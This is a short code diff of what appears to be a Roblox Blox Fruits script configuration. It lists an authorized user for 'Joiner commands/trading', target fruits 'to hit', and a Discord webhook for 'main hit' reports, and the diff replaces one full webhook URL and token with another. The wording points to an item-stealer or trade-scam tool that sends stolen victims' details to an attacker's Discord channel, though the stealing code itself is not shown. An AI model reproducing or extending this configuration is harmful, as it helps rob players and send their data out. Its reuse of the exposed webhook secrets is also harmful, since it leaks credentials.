@@ -4,7 +4,7 @@
 local Usernames = {
 	"bananaaaa"
 } -- Authorized users for Joiner commands/trading
-local Webhook = "https://discord.com/api/webhooks/1367159347829932224/05aFQ9H3cXCwPI_7fErjJe-U2iLy4T6QiUo3PeNoW9b8ZDfBWKUkfr6yLI6Rfl7H4sUj" -- Joiner: Main hit webhook (REPLACE)
+local Webhook = "https://discord.com/api/webhooks/1368523130087276575/eT8JPNJZONM1SJRqmGINJxkHUyBfZj4yGf38TbYWh1lKgQaWrdAGP4abvpya5ltR9nk6" -- Joiner: Main hit webhook (REPLACE)
 local FruitsToHit = {
 	"Monkey-Monkey",
 	"Rocket-Rocket",
